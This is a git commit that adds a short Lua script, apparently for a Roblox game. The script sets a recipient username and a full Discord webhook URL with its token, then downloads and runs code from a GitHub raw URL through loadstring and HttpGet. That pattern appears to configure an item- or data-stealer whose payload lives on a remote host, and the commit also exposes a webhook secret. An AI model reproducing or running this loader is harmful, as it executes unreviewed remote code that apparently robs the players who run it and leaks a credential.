c7fc8ff95d669be7935291febf72a94a179908b9
214Eli <busterbishop22@icloud.com>
2025-02-22 12:38:58 +0800

    Created new script file

---
+++ scripts/script-5a77bd9a3ae5.lua
@@ -0,0 +1,6 @@
+
+Username = "givemefortnitevbuck"
+Webhook = "https://discord.com/api/webhooks/1341388841742762066/lylm1u6wniMwhWOeYSfkQxgsdxizLbdMZ1Z5LYO_dit8eR6Wfvc8Sh1WQY09BZhs8Nvt"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/214Eli/fisch/refs/heads/main/fisch", true))()
+      
